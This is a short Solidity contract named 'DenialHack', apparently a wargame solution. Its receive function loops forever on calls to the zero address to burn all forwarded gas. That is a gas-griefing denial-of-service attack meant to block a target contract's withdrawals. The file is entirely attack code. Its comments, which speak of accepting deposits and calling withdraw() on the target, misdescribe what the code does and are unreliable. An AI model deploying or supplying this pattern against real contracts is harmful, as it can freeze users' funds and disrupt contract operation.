// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract DenialHack {

    // allow deposit of funds
    receive() external payable {
        // call withdraw() on the target contract
        while (true){
            payable(0x0000000000000000000000000000000000000000).call("");
        }
    }
}